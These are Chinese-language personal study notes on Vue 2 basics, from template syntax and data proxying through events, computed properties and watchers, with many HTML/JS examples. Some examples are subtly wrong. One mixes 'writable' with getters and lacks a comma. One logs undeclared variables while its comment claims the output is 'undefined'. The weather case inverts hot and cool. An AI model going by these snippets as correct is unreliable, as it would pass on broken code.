#                                        Vue

https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=2&spm_id_from=pageDriver&vd_source=68d62bca83c00beffe7ed7e574e02f6c

## 一、Vue简介

### 1.vue是什么

Vue (发音为 /vjuː/，类似 **view**) 是一款用于**构建用户界面的 JavaScript 框架**。它基于标准 HTML、CSS 和 JavaScript 构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。

### 2.开发历程

![image-20230911231903355](D:\typora_photo\image-20230911231903355.png)

### 3.Vue的特点

- 1.采用**组件化**模式，提高代码复用率、且让代码更好维护。

- 2.**声明式编码**，让编码人员无需直接操作DOM，提高开发效率。

- 3.使用**虚拟DOM+优秀的Diff算法**，尽量复用DOM节点。

  ![image.png](D:\typora_photo\1643035195917-eb463d5c-5a77-43a6-914e-dd0f83b0ff80.png)

![image-20230911232058152](D:\typora_photo\image-20230911232058152.png)

![image.png](D:\typora_photo\1643035897962-d84f5075-0fd7-4d52-ad8c-31371d98bb08.png)

### 4.vue环境搭建

（1）在https://v2.cn.vuejs.org/v2/guide/installation.html中下载vue.js文件

（2）下载开发者工具vue.crx（https://pan.baidu.com/s/1MtYvMPew4lb14piIrs9x6w?login_type=weixin&_at_=1694524450731 提取码6666)，添加到浏览器的扩展工具中，修改脚本的Vue.config.productionTip=false取消提示。

（3）favicon需要将页签图标放在项目根路径,重新打开就有了(shft+F5强制局新）

### 5.初识Vue

#### **小结：**

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象:
2. root容器里的代码依然符合html规范。只不过混入了一些特殊的Vue语法;
3. root容器里的代码被称为【Vue模板】:
4. Vue实例和容器是**一一对应**的:
5. 真实开发中**只有一个Vue实例**，并且会配合着组件一起使用;
6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性;{{xxx}}里面的数据可以是表达式{{name.toUpperCase()}}、{{1+1}}
7. 一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新:

#### **注意区分:js表达式和js代码(语句)**

1. 表达式:一个表达式会产生一个值，可以放在任何一个需要值的地方:

```js
(1).a    //变量
(2).a+b  //表达式
(3).demo(1)  //方法函数
(4).x=== y ? 'a' :'b'  //三元表达式 
```

2.  js代码(语句)

```js
(1).if(){}
(2).for(){}
```

#### 示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>hello,{{name.toUpperCase()}},{{address}},{{Date.now()}},{{1+1}}</h1>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; //以阻止 vue 在启动时生成生产提示。
        new Vue({
            el: '#root',//el用于指定当前vue示例为哪个容器服务，值通常为css选择器字符串
            data: {
                name: "anjingde",//data中用于存储数据，数据供el所指定的容器去使用，
                               //值我们暂时先写为一个对象
                address: "北京"
            }
        })
    </script>
</body>
</html>
```

![image-20230912223301053](D:\typora_photo\image-20230912223301053.png)

![image-20230912223615798](D:\typora_photo\image-20230912223615798.png)

## 二、Vue核心

### 2.1模板语法

#### 2.1.1 效果

![image-20240328150057167](D:/typora_photo/image-20240328150057167.png)

#### 2.1.2 模板的理解

html 中包含了一些 JS 语法代码，语法分为两种，分别为： 

1.插值语法（双大括号表达式） 

2.指令（以 v-开头）

#### 2.1.3  插值语法 

1. 功能: 用于**解析标签体内容** 
2. 语法: {{xxx}} ，xxxx 会作为 js 表达式解析 
3. 可以是表达式，如三元表达式、js表达式reverse,join等等，

#### 2.1.4  指令语法 

1. 功能: 解析标签属性、解析标签体内容、绑定事件 

2. 举例：v-bind:href = 'xxxx' ，xxxx 会作为 js 表达式被解析，其中xxxx可以为url.toUpperCase()这样的表达式

3. 说明：Vue 中有很多的指令，此处只是用 v-bind 举个例子

   **v-bind：相当于 ：**

#### 2.1.5 示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h2>你好，{{name}}</h2>
        <hr>
        <h1>指令语法</h1>
        <a v-bind:href="school.url.toUpperCase()">{{school.name}}学习1</a>
        <a :href="school.url" :x="school.hello">{{school.name}}学习2</a>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; //以阻止 vue 在启动时生成生产提示。
        new Vue({
            el:'#root',
            data:{
                name:'我是xx',
                //层级的对象
                school:{
                    name:'前端vue',
                    hello:'beijing',
                    url:'https://v2.cn.vuejs.org/v2/guide/installation.html'
                }
            }
        })
    </script>
</body>
</html>
```

### 2.2 数据绑定

#### 2.2.1  效果

![image-20240328150257470](D:/typora_photo/image-20240328150257470.png)

![image-20240328150319315](D:/typora_photo/image-20240328150319315.png)

#### 2.2.2  单向数据绑定

1. 语法：**v-bind:href ="xxx" 或简写为 :href**

2. 特点：数据只能从 data 流向页面

#### 2.2.3  双向数据绑定

1. 语法：**v-mode:value="xxx" 或简写为 v-model="xxx"** 

2. 特点：数据不仅能从 data 流向页面，还能从页面流向 data

3. v-model 只能应用在表单类元素（输入类元素）上，比如input,单选框，多选框，select,textarea等等,

4. 当v-model应用在单选框中，<input type="checkbox" v-model="x"/>，此时的x值是跟随单选框的选中状态做出布尔值的改变的。

5. 示例： 

   ```html
   <textarea  cols="30" rows="10" v-model:x="name">ggggg</textarea>
   ```

   ![image-20240328150337226](D:/typora_photo/image-20240328150337226.png)

   ![image-20240328150353585](D:/typora_photo/image-20240328150353585.png)

#### 2.2.4 示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!-- 正常写 -->
<div id="root">
    单向数据绑定<input type="text" v-bind:value="name"><hr>
    双向数据绑定<input type="text" v-model:value="name"><br>
    <textarea  cols="30" rows="10" v-model:x="name">ggggg</textarea>
</div> 
 <!-- 简写 -->
<!--<div id="root">
    单向数据绑定<input type="text" :value="name"><hr>
    双向数据绑定<input type="text" v-model="name"><br>
</div>-->
    <script type="text/javascript">
        Vue.config.productionTip = false; //以阻止 vue 在启动时生成生产提示。
        new Vue({
            el:'#root',
            data:{
                name:"尚硅谷"
            }
        })
        </script>
</body>
</html>
```

![image-20240328150415766](D:/typora_photo/image-20240328150415766.png)

#### 2.2.5 el和data的两种写法

##### （1） el

- 创建vue实例对象的时候配置el

- 先创建vue实例,赋值给v，随后通过**v.$mount('#root')**指定el的值

##### （2）data

- **对象**式：data：{ }
- **函数**式：data( ){return{ }}  或者data:function( ){ return {  }}
- 如何选择：目前哪种写法都可以，以后到组件时，data必须使用函数式，否则会报错

**注意：此处的由vue管理的函数一定不能写箭头函数，因为箭头函数的this指向windows，而非箭头函数的this才是指向vue**

##### （3）示例

```js
    <script type="text/javascript">
        Vue.config.productionTip = false; //以阻止 vue 在启动时生成生产提示。
        const v = new Vue({
            // el: '#root', //el写法一
            // data: {     //data写法一
            //     name: "尚硅谷"
            // }
            // data:function(){ //data写法二
            // return{
            //     name:'尚硅谷'
            // }
            data() {//data写法三
                console.log(this);//vue对象
                return {
                    name: '尚硅谷'
                }
            }
        })
        setTimeout(() => {
            v.$mount('#root');//el写法二
        }, 1000);
    </script>
```

#### 2.2.6  MVVM 模型

![image-20240328152653840](D:/typora_photo/image-20240328152653840.png)

![image-20240328153443623](D:/typora_photo/image-20240328153443623.png)

#### MVC、MVP、MVVM之间的区别是什么？

软件架构设计模式
(1) MVC模式分为三层，M层数据模型层（保存应用数据），V层视图层（视图展示，把model中的数据可视化出来）以及C层控制器层（负责业务逻辑，将用户行为对model的数据进行修改），当视图改变的时候，需要写一个Controller去修改数据，这样子下来，每改变一次都要循环实现这一套逻辑，显示很繁琐。Model和View之间可以通信。
(2) MVP则限制了Model和View的交互都要通过Presenter驱动，这样对Model和View解耦，提升项目维护性和模块复用性。
(3) 而MVVM是对MVP的P的改造，用VM替换P，M层数据模型层，V层视图层，ViewModel逻辑层，视图变更时会走到VM层，ViewModel通过DOM监听器，实现一套数据响应式机制自动响应Model中数据的变化，引发数据更新。反之，数据的变更时会走到VM层，ViewModel会实现一套更新策略自动将数据变化转换为视图变化，然后走到V层引发视图更新。

**MVC与MVVM的主要区别在于数据和视图的改变并不需要通过书写一个控制器去实现，而是抽象出一个viewmodel。Model和View是否能够进行通信，MVVM来说限定了model和view层只能通过VM进行通信，VM订阅Model并在数据更新时候自动同步更新到视图。**

**我们写的代码就是V层**

虽然没有完全遵循 [MVVM 模型](https://zh.wikipedia.org/wiki/MVVM)，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 `vm` (ViewModel 的缩写) 这个变量名表示 Vue 实例。

1. M：模型(Model) ：对应 data 中的数据

2. V：视图(View) ：模板

3. VM：视图模型(ViewModel) ： Vue 实例对象(驱动)

![image-20240328150433450](D:/typora_photo/image-20240328150433450.png)

![image-20240328160210905](D:/typora_photo/image-20240328160210905.png)



观察发现：

（1）data中所有属性，最后都出现在**vm**身上。

（2）**vm身上所有属性以及Vue原型身上所有属性，在Vue 模板都可以直接使用**。

![image-20240328150456430](D:/typora_photo/image-20240328150456430.png)

```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
      <h2>你好，{{name}}</h2>
      <h2>hello,{{address}}</h2>
      <h4>测试1,{{$scopedSlots}}</h4>
      <h4>测试2,{{_c}}</h4>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; 
        const vm=new Vue({
            el: '#root',
            data: {
                name: "anjingde",
                address: "北京"
            }
        })
        console.log(vm);
    </script>
</body>
</html>
```

![image-20240328150514399](D:/typora_photo/image-20240328150514399.png)

### 2.3 数据代理

#### 2.3.1 Object.defineProperty()

##### 作用：

直接在一个对象上定义一个新属性，或者修改一个已经存在的属性。

```javascript
Object.defineProperty(obj, prop, desc)
```

> 1. obj 需要定义属性的**当前对象**
> 2. prop 当前需要定义的**属性名**
> 3. desc 属性**描述符**

##### 描述符：

value（设置当前属性值）、enumerable（控制属性是否可以枚举，就是是否参加遍历，默认为false）、writable（控制属性是否可以被修改，默认为false）、configurable（控制属性是否可以被删除，默认为false）

删除对象中某个属性的方法：delete 对象名.属性

##### 存取描述符 :

`get`：一个给属性提供`getter`的方法，如果没有`getter`则为`undefined`。该方法返回值被用作属性值。默认为`undefined`。

`set`：一个给属性提供`setter`的方法，如果没有`setter`则为`undefined`。该方法将接受**唯一参数**，并将该参数的新值分配给该属性。默认值为`undefined`。

##### 示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        let number=18;
        let person={
            name:'张三',
            sex:'男',
            // age:'18'
        }
        Object.defineProperty(person,'age',{
            // value:18,//设置值
            enumerable:true,//可枚举
             writable:true,//可写
             configurable:true//属性是否可以被删除
            
            //当有人读取person的age属性时，get 函数(getter)就会被调用，且返回值就是age的值。
            get(){
                console.log('有人读取age属性了');
                return number;
            },
              //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值。
            set(value){
                console.log('有人修改age属性了',value);
                number=value;
            }
        })
        for(let key in person){
            console.log(person[key]);
        }
        console.log(person);
    </script>
</body>
</html>
```

![image-20230914103945929](D:\typora_photo\image-20230914103945929.png)

#### 2.3.2 数据代理定义

**数据代理：通过一个对象代理另一个对象中属性的操作**，就是可以通过obj2去修改obj1中的某个值

示例：

```js
 <script>
        let obj={x:100};
        let obj2={y:200};
        Object.defineProperty(obj2,'x',{
            get(){
                return obj.x;
            },
            set(value){
                obj.x=value
            }
        })
    </script>
```

![image-20230914105013218](D:\typora_photo\image-20230914105013218.png)

#### 2.3.3 关于数据代理

![image-20230914112341453](D:\typora_photo\image-20230914112341453.png)

![image-20230914112946887](D:\typora_photo\image-20230914112946887.png)

##### 1.Vue中的数据代理:

​          **通过vm对象来代理data对象中属性的操作(读/写)，vm身上的data中的属性是通过vm._data身上的属性得到的，通过get和set方法**

##### 2.Vue中数据代理的好处:

​         更加方便的操作data中的数据

##### 3.基本原理:

​        通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter在getter/setter内部去操作(读/写)data中对应的属性。

![image-20230914112119405](D:\typora_photo\image-20230914112119405.png)

Vue将data中的数据拷贝了一份到_data属性中，又将data里面的属性提到Vue实例中(如 name)，通过 Object.defineProperty实现数据代理，这样通过getter/setter操作name，进而操作 _data中的name。同时当_data中的name改变时，视图也会改变，说明在_data中也有get和set方法去驱动视图改变。而__data又对data进行数据劫持，实现响应式。

##### 示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>名字，{{name}}</h2>
        <h2>地点，{{address}}</h2>
        <!-- 两种写法是一致的
        <h2>名字，{{_data.name}}</h2>
        <h2>地点，{{_data.address}}</h2> -->
    </div>
    <script type="text/javascript">
        let data = {
            name: "anjingde",
            address: "北京"
        }
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data
        })
    </script>
</body>
</html>
```

![image-20230914113701098](D:\typora_photo\image-20230914113701098.png)

data里面是数据劫持，为了在改变data里面的值时页面能监测到，从而实现响应式。好像是双向监测(方向一:vm中name改变 -> _data中name改变 -> 页面上name改变。  方向二:页面上name改变-> _data中name改变 -> vm中name改变)

#### Vue2数据响应式原理

##### Vue 在初始化数据时，会对 data 进行遍历，并使用 Object.defineProperty 把这些属性转为 getter/setter。 每个组件实例都对应一个 watcher 实例，当页面使用对应属性 时，首先会用 getter 进行依赖收集(收集当前组件的 watcher) 如果属性发生变化 setter 触发时会通知相关依赖进行更新操作(发布订阅)。

### 2.4 事件处理

#### 2.4.1 效果



#### 2.4.2 事件对象event的方法

<img src="D:\typora_photo\image-20230914170640900.png" alt="image-20230914170640900"  />

#### 2.4.3 事件的基本用法

1. 使用**v-on:xxx 或 @xxx** 绑定事件。其中xxx是事件名;

2. 事件的回调需要配置在**methods对象**中，最终会在vm上;

3. methods中配置的雨数，不要用箭头函数，否则this就不是vm了:

4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象;

5. **@click="demo" 和 @click="demo($event)”**效果一致，但后者可以传参;

   6.methods中的配置函数若无参数可以不加（），若有参数可以加（），其中每个函数有一个内置的事件对象 event,可以在参数中写入**$event**来表示。

   7.函数在vm对象中没有数据代理的过程，当把函数放在data里而不是methods里时，就会出现函数有数据代理的过程，但是这样子写会很复杂，一般不采纳这种方式。

***示例***：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        *{
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="root">
    <a href="http://bd.meikankeji.com/g.html" v-on:click="showInfo">链接1</a><br>
    <button v-on:click="showInfo">点击{{name}}跳转1</button><br>
    <button @click="showInfo2(66,$event)">点击{{name1}}跳转2</button></div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
       const vm= new Vue({
            el: '#root',
            data: {
                name: "anjingde",
                name1:'背景'
            },
            methods:{
                showInfo(event){
                    console.log(event);//pointevent对象
                    console.log(this===vm);//true
                    console.log(event.target);// <button>点击anjingde跳转1</button>
                    alert("你好呀");
                },
                showInfo2(number,a){
                    console.log(number,a,b,c);//66 pointevent对象 undefined undefined
                    console.log(a);//pointevent对象
                    console.log(number);//66
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230914172038474](D:\typora_photo\image-20230914172038474.png)

#### 2.4.4 绑定监听

1. v-on:xxx="fun" 

2. @xxx="fun" 

3. @xxx="fun(参数)" 

4. 默认事件形参: event

5. 隐含属性对象: $event


#### 2.4.5 事件修饰符

1. .prevent : 阻止事件的**默认**行为 event.preventDefault()
2. .stop : 停止事件**冒泡** event.stopPropagation()
3. once:事件只触发一次(常用)
4. capture:使用事件的**捕获模式**;
5. self:只有event.target是当前操作的元素是才触发事件;
6. passive:事件的默认行为立即执行,无需等待事件回调执行完毕:

**注：**

**修饰符可以连续写，比如：@click.prevent.stop="show"；**

**scroll 是滚动条滚动,passive没有影响，在事件执行时滚动条会自动滚动;**

**wheel是鼠标滚轮滚动，passive有影响，在事件执行时滚动条不会自动滚动。**

**passive是区分事件的，不一定对所有事件有效。**

示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    </head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        * {
            padding: 0;
        }
        .box1 {
            height: 50px;
            padding: 20px;
            background-color: skyblue;
        }
        .box2 {
            height: 30px;
            background-color: rgb(202, 106, 54);
        }
        li {
            list-style: none;
            height: 90px;
            background-color: pink;
        }
        .list {
            width: 250px;
            height: 200px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div id="root">
        <h4>阻止事件的默认行为event.preventDefault() </h4>
        <a href="https://www.yuque.com/cessstudy/kak11d/ya9y35" @click.prevent="show">vue学习</a>
        <h4>停止事件冒泡event.stopPropagation()</h4>
        <div @click="show">
            <!-- <button @click.stop="show">点击</button> -->
            <!-- 阻止事件默认行为与冒泡 -->
            <a href="https://www.yuque.com/cessstudy/kak11d/ya9y35" @click.prevent.stop="show">vue学习</a>
        </div>
        <h4>once:事件只触发一次(常用)</h4>
        <button @click.once="show">点击</button>
        <h4>使用事件的捕获模式</h4>
        <div class="box1" @click.capture="showMsg(1)">
            <!-- 加在box1身上表示在box1捕获事件时就执行函数 -->
            div1
            <div class="box2" @click="showMsg(2)">div2</div>
        </div>
        <h4>只有event.target是当前操作的元素是才触发事件</h4>
        <div class="demo1" @click.self="show"> <!-- 类似于阻止冒泡 -->
            <button @click="show">点击提示</button>
        </div>
        <h4>事件的默认行为立即执行,无需等待事件回调执行完毕</h4>
        <ul @wheel.passive="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: "anjingde",
            },
            methods: {
                show() {
                    alert("你好呀");
                },
                showMsg(num) {
                    console.log(num);
                },
                demo() {
                    for (let i = 0; i < 1000; i++) {
                        console.log("#");
                    }
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230914213406271](D:\typora_photo\image-20230914213406271.png)

![image-20230914214137812](D:\typora_photo\image-20230914214137812.png)

#### 2.4.6 按键(键盘)事件

1. keycode : 操作的是某个 keycode 值的键

2. keyName : 操作的某个按键名的键(少部分)

3. Vue中常用的按键别名:
   回车=> enter
   删除=>delete(捕获“删除”和“退格”键)

   退出 =>esc

   空格=> space

   换行 => tab(必须配合keydown使用，因为tab作用是转移焦点，keyup触发时焦点已经转移就不会触发了)

   上=>up

   下 => down

   左 => left

   右 => right

   4.Vue未提供别名的按键，**可以使用按键原始的key值去绑定**，但注意要转为kebab-case(短横线命名)

   ![image-20230914223045785](D:\typora_photo\image-20230914223045785.png)

   其中切换大小写按键为CapsLock，当遇到按键原名有两个大写字母的要将字母全部变为小写，然后切分两个大写名词。

   5.系统修饰键(用法特殊):ctrl、 alt、shift、meta（window按键）

   (1)配合keyup使用:按下修饰键的同时，再按下其他健，随后释放其他键，事件才被触发。

   (2).配合keydown使用:正常触发事件。

   (3).系统修饰符后面可以带上一个参数，表示按下修饰符+某个指定字母才能触发。

   ![image-20230914223507585](D:\typora_photo\image-20230914223507585.png)

   6.也可以使用keyCode去指定具体的按键(不推荐)。

   7.**Vue.config.keyCodes.自定义键名=键码**，可以去定制按键别名。

示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
      <h1>学习中</h1>
      <input type="text" placeholder="按键别名" @keyup.enter="show"><br>
      <input type="text" placeholder="按键原名" @keyup.Enter="show"><br>
      <input type="text" placeholder="自定义按键名" @keyup.huiche="show">
      <input type="text" placeholder="切换大小写按键" @keyup.caps-lock="show">
      <input type="text" placeholder="系统修饰符按键" @keyup.ctrl.y="show">
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        Vue.config.keyCodes.huiche=13;
        new Vue({
            el: '#root',
            methods:{
                show(e){
                    console.log(e.keyCode);//按键码
                    console.log(e.key);//按键名
                    console.log(e.target.value);
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230914222415692](D:\typora_photo\image-20230914222415692.png)

### 2.5 计算属性与监视

#### 2.5.1 效果

![image-20230914231753038](D:\typora_photo\image-20230914231753038.png)

利用插值语法与methods实现

示例1 插值语法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        input {
            margin-top: 10px;
        }
        #quan {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h3>姓名案例</h3>
    <div id="root">
        姓：<input type="text" id="familyname" v-model="family"><br>
        名：<input type="text" id="lastname" v-model="last"><br>
        <div id="quan">全名：<p>{{family.slice(0,3)}}-{{last}}</p>
            <!-- 截取前3个 -->
        </div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data:{
                family:'张',
                last:'三'
            }
        })
    </script>
</body>
</html>
```

示例2 methods

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        input {
            margin-top: 10px;
        }
        #quan {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h3>姓名案例</h3>
    <div id="root">
        姓：<input type="text" id="familyname" v-model="family"><br>
        名：<input type="text" id="lastname" v-model="last"><br>
        <div id="quan">全名：<span>{{fullname()}}</span></div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data:{
                family:'张',
                last:'三'
            },
            methods:{
                fullname(){
                    console.log(this);//vue
                    return this.family+'-'+this.last;
                }
            }
        })
    </script>
</body>
</html>
```

##### 注意：

（1）当数据发生变化时，vue就会重新解析一次模板，更新页面值。

（2）**{{方法名（）}}**代表方法的调用，此时的方法不是事件绑定，是插值语法，this对象为vue实例而不是event

#### 2.5.2 **计算属性-computed**

##### **定义：**

**要用的属性不存在，需要通过已有属性计算得来**

##### **原理：**

底层借助了 Objcet.defineproperty()方法提供的 getter和setter

##### **get 函数什么时候执行?**

- a.**初次读取时会执行一次**
- b.当依赖的数据**发生改变**时会被再次调用

**优势：**与methods 实现相比，内部有缓存机制(复用)，效率更高，调试方便

##### **备注**

- a.计算属性**最终会出现在 vm上**，直接读取使用即可

- b.如果计算属性要被修改，那必须写set函数去响应修改，且 set 中要引起计算时依赖的数据发 

  生改变

- c.如果计算属性确定不考虑修改，可以使用计算属性的简写形式

- d.要显示的数据不存在，要通过计算得来。

- e.在 **computed 对象中**定义计算属性。

- f.在页面中使用**{{方法名}}**来显示计算的结果。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        input {
            margin-top: 10px;
        }
        #quan {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h3>姓名案例</h3>
    <div id="root">
        姓：<input type="text" id="familyname" v-model="family"><br>
        名：<input type="text" id="lastname" v-model="last"><br>
        <div id="quan">全名：{{fullname}}</span>
            <!-- 截取前3个 -->
        </div>
        <!-- 当上面读取完一次fullname时，会缓存fullname的值，后面三个不会再调用getter，直接走缓存 -->
        <div id="quan">全名：{{fullname}}</span> </div>
       <div id="quan">全名：{{fullname}}</span></div>
        <div id="quan">全名：{{fullname}}</span></div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                family: '张',
                last: '三'
            },
            computed: {
                fullname: {
                    //当有人读取fullname,get会被调用，且返回值作为fullname的值
                    get() {
                        console.log('get调用了');
                        console.log(this);
                        return this.family + '-' + this.last;

                    },
                    set(value) {
                        console.log('set', value);
                        const arr = value.split('-');
                        this.family = arr[0];
                        this.last = arr[1];
                    }

                }
            }
        })
    </script>
</body>
</html>
```

![image-20230915202640708](D:\typora_photo\image-20230915202640708.png)

![image-20230915205936784](D:\typora_photo\image-20230915205936784.png)

##### 简写

当computed的属性只需要利用getter方法不需要setter时，可以采用简写形式：

![image-20230915210228964](D:\typora_photo\image-20230915210228964.png)

#### 2.5.3  天气案例

点击按钮切换天气

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天的天气很{{info}}</h2>
        <!-- 绑定事件时：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot=!isHot">切换天气</button> -->
        <button @click="changeweather">切换天气</button>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm=new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            computed: {
                info() {
                    return this.isHot ? '凉爽' : '炎热';
                }
            }, 
            methods: {
                changeweather() {
                    this.isHot = !this.isHot;
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230915205003222](D:\typora_photo\image-20230915205003222.png)

![image-20230915205013439](D:\typora_photo\image-20230915205013439.png)

#### 2.5.4  监视属性-watch（**侦听属性**）

- 通过 vm 对象的**$watch()或 watch** 配置来监视指定的属性

- 当属性变化时, 回调函数自动调用, 在函数内部进行计算

- **当被监视的属性变化时，回调函数自动调用**，进行相关操作
- 监视的属性必须存在，才能进行监视，**既可以监视 data，也可以监视计算属性**
- 配置项属性immediate:false，改为true，则初始化时调用一次handler(newValue,oldValue)
- 监视有两种写法: a.  创建Vue 时传入 watch:{ } 配置

​                                    b.   通过 vm.$watch()监视

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天的天气很{{info}}</h2>
        <!-- 绑定事件时：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot=!isHot">切换天气</button> -->
        <button @click="changeweather">切换天气</button>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            computed: {
                info() {
                    return this.isHot ? '凉爽' : '炎热';
                }
            },
            methods: {
                changeweather() {
                    this.isHot = !this.isHot;
                }
            },
            watch: {
                //写法一：当很明确要对哪个属性进行监听可以这样子写
                info: {
                    immediate: true,//初始化是会先调用handler一次
                    //当info发生变化时，会调用
                    handler(newValue, oldValue) {
                        console.log(this);//vue实例
                        console.log('info值改变了', newValue, oldValue);
                        console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
                    }
                }
                // isHot: {
                //     immediate: true,//初始化是会先调用handler一次
                //     //当info发生变化时，会调用
                //     handler(newValue, oldValue) {
                //         console.log('isHot值改变了', newValue, oldValue);
                //         console.log('天气变了，现在是'+newValue+'，过去是'+oldValue);
                //     }
                // }

            }
        })
        //写法二：当对于属性监听后续加上的可以这样子写
        vm.$watch('info', {
            immediate: true,//初始化是会先调用handler一次
            //当info发生变化时，会调用
            handler(newValue, oldValue) {
                console.log('info值改变了', newValue, oldValue);
                console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
            }
        })
    </script>
</body>
</html>
```

![image-20230915212623406](D:\typora_photo\image-20230915212623406.png)

#### 2.5.5 深度监视 deep

- Vue中的watch默认不监测对象内部值的改变(一层)。
- 配置**deep:true**可以监测对象内部值改变(**多层**)。

备注:

- (1)**Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以!**

  ![image-20230915221049787](D:\typora_photo\image-20230915221049787.png)

- (2) 使用watch时根据数据的具体结构，决定是否采用深度监视。

- (3) watch监听时，当有多层级数据时，是要**加单引号**' ',单个属性可以不加。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天的天气很{{info}}</h2>
        <!-- 绑定事件时：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot=!isHot">切换天气</button> -->
        <button @click="changeweather">切换天气</button><hr/>
        <h3>a的值是{{number.a}}</h3>
        <button @click="number.a++">点我a加1</button>
        <hr/>
        <h3>b的值是{{number.b}}</h3>
        <button @click="number.b++">点我b加1</button>
        <button @click="number={a:1,b:2,c:{d:{e:200}}}">彻底替换number</button>
        {{number.c.d.e}}
    </div>
